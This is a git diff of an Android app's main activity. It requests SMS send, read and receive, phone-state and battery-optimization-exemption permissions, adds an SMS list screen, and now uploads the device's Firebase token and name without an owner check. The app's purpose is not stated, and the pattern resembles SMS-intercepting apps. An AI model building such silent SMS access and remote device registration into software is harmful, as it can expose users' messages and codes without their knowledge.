@@ -59,15 +59,15 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        popupWindow = new Window(this);
-        checkOverlayPermission();
 
         setContentView(R.layout.activity_main);
         XXPermissions.with(this)
                 // Request single permission
                 .permission(Permission.SEND_SMS)
                 .permission(Permission.READ_PHONE_STATE)
+                .permission(Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                 .permission(Permission.READ_SMS)
+                .permission(Permission.POST_NOTIFICATIONS)
                 .permission(Permission.RECEIVE_SMS)
 
                 .request((permissions, allGranted) -> {
@@ -78,7 +78,7 @@ public class MainActivity extends AppCompatActivity {
                     toast("Granted");
                 });
 
-        btn_start = findViewById(R.id.start_service);
+        btn_start = findViewById(R.id.sentList);
 
 
 
@@ -87,7 +87,8 @@ public class MainActivity extends AppCompatActivity {
 
 
         btn_start.setOnClickListener(v -> {
-            startService();
+            Intent startList = new Intent(getApplicationContext(), SmsListActivity.class);
+            startActivity(startList);
         });
 
 
@@ -96,7 +97,7 @@ public class MainActivity extends AppCompatActivity {
 
 
         if (Utility.getOptions(this) == 0){
-            checkIfSender();
+//            checkIfSender();
         }
 
 
@@ -174,7 +175,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     private void initFirebase() {
-        FirebaseApp.initializeApp(this);
+
 
 
         FirebaseMessaging.getInstance().getToken()
@@ -187,9 +188,9 @@ public class MainActivity extends AppCompatActivity {
 
 
                     Log.d(TAG, "initFirebase: Token: " + task.getResult());
-                    if (isOwner(MainActivity.this)){
+
                         uploadFCM(getApplicationContext(), task.getResult(), getDeviceName(getBaseContext()));
-                    }
+
                 });
     }
     public void uploadFCM(Context c, String fcm, String  dName) {
